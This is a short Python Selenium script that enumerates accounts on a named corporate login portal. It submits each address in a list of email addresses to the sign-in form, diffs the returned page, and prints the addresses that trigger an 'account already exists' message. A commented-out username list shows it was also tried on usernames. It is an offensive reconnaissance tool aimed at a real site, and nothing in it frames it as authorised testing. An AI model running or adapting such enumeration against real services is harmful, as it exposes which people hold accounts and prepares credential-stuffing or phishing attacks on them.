from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')

print("The usernames present in wasPost are:")

#for i in ["BegForMercy", "BraiasjdnkjnAxe", "CrazyMind", "DeathWaasdaish", "DisasterMaster", "ElNaaaino", "EndlessFacepalms", "FreakingOblin", "GhostlyPresence", "GridlockAndKey", "HoofHearted666", "KungFuMonk", "NineTees", "PlzJustDie", "SeekNDestroy", "SinisterChill", "BegqwForMercy", "BasxasdxrainAxe", "Crazy1Mind", "DeatasdasdhWish", "Dis1asterMaster", "EaslNino", "EndlessFaaacepalms", "FrrreakingOblin", "GhossdtlyPreseasnce", "GrisadlockAndKey", "HoofaHearted666", "KsungFuMonk", "NinessTees", "sPlzJustDie", "sSeeksNDestroy", "SssinisddterChill"]:
for i in ["superman@gmail.com", "yenojam209@shzsedu.com", "priyasdsdanka@gmail.com", "byenojam209@shzsedu.com", "asjdbkajsdnkjas@gmail.com", "spiderman@gmail.com", "yenojam209@shzsedu.com"]:
    user = i

    driver.get("https://my.deloitte.com/?site=us-en")
    p1 = driver.page_source
    sleep(3)
    elem=driver.find_element_by_xpath("//input[@type='email']")
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "There's already an account associated with this email address." in p3:
        print(i)
    sleep(5)

